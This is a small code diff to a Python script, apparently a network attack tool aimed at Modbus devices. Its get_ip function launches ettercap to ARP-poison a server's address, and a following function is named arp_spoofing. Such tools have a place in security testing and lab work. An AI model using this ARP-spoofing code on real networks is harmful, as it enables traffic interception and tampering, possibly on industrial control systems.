@@ -25,10 +25,11 @@ func_options = {
 console = Console()
 
 def get_ip():
-	arp1 = 'nohup ettercap -Tq -i eth0 -M ARP /{}// >/dev/null 2>&1 &'.format(mb_server['ip'])
-	os.system(arp1)
-	os.system('pkill -f ettercap')
-	sleep(1)
+    global mb_server, mb_client
+    arp1 = 'nohup ettercap -Tq -i eth0 -M ARP /{}// >/dev/null 2>&1 &'.format(mb_server['ip'])
+    os.system(arp1)
+    os.system('pkill -f ettercap')
+    sleep(1)
 
 def arp_spoofing():
     console.log(f"MB_server={mb_server['ip']}")
